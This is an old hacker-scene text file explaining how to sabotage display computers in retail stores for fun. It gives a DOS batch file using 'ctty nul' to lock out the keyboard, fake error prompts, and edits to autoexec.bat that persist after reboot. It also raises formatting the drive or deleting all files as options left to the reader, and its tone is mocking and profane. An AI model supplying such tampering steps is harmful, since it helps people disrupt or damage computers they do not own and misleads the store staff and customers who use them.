	Ah well, it's near the end of yet another summer in the vast chain
of them, yet this one is seemingly embedded in my mind for a reason not yet
fully apperrent to me. The light fragrant air of the summertime blis plays
through my soul, my existance with unabounded clarity and strenght. Yet all
is not fullfilled, all is not complete in my experience. That is what landed
me at the Emeryville Circut City and that is what lead me to the racks of
your typical Packard Bell-only-brand piece of shit 8088 computers with one
160k floppy and a 5 meg HD (if any). I suddenly felt the extreme urge to 
fling myself upon these unspeakably horrible piece of shit computers, yet I
held myself back, opting for a more clever way of phucking them over, which
brings me into the main reason I wrote this phile in the first place -- How
to have fun crashing/fucking over those throwaway store display PC's.

--------------------------------------------------------------------------

	First of all, the computer you're targeting in a store is probably
running a promotional demo or shell. Just follow the cues and exit to dos..
..it's real easy. Then, once you're in dos, there's plenty you can do, only
confined by your imagination and dos expertise. Of course you could just 
format the HD or do a DEL *.* thingie, but that's real obvious, lame, and
not recommended if near store personnel. And anywayz, that's taking things
a bit too far than they should, and could get yourself in mondo trouble. But
that's for you to decide. Even as effective but not destructive is just 
making a simple batch file like this:

  c:\>Copy con fuck.bat
      ctty nul
      cls
      ^Z  (control Z)

then executing it by typing fuck and leaving. That completely disables the
keyboard and clears the screen, not allowing anyone to do anything except
reset the computer.

	Another trick that isn't quite as effective but even more fun is 
playing around with the prompt. It dosent hafta say "C:\> or C>" it can say
what ever you want. Just type in "prompt error 12 in line 12878" at the 
prompt and watch the fun as people keep hitting return and that message is
displayed over and over. Even better is aletering the autoexec.bat file so
it changes the prompt to someting like "this computer is one piece of shit"
upon every reboot. Or put the two ideas above together to create a batch
file that displays the error message and disables the keyboard. The stupid
fucks working at the store and the stupidfucks looking at the computer won't
know what the hell is going on whatever you do, so they'll think something
is really wrong.

	So when you're ever in a departmen/electronics store and have nothing
better to do, remember these helpful tips and use your imagination to think
up of better ones yourself. Have much fun in your endeavors an may the force
be with you always.......
